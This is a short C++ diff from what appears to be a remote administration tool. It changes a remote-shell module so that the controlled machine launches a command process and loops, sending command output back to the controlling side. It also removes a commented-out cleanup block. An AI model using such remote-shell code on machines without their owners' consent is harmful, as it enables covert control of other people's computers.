@@ -85,7 +85,13 @@ DWORD WINAPI RunModuleShellRemote(CPacket* pPacket)
 	CModuleShellRemote* pModule = new CModuleShellRemote(pChildSocketClient);			// 在这里面给pChildSocketClient->m_pModule赋值
 
 	pChildSocketClient->StartSocketClient();
-	pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);
+
+	pModule->RunCmdProcess();
+
+	// 等待被控端向主控端发回了SHELL_CONNECT包
+	WaitForSingleObject(pModule->m_hSendPacketShellRemoteConnectEvent, INFINITE);
+
+	pModule->LoopReadAndSendCommandReuslt();
 
 	pChildSocketClient->WaitForExitEvent();
 
@@ -93,12 +99,6 @@ DWORD WINAPI RunModuleShellRemote(CPacket* pPacket)
 		delete pChildSocketClient;
 		pChildSocketClient = nullptr;
 	}
-
-	// 一直崩在这里，哪里的析构出了问题？？
-	//if (pModule != nullptr) {
-	//	delete pModule;
-	//	pModule = nullptr;
-	//}
 
 	if (pPacket != nullptr) {
 		delete pPacket;
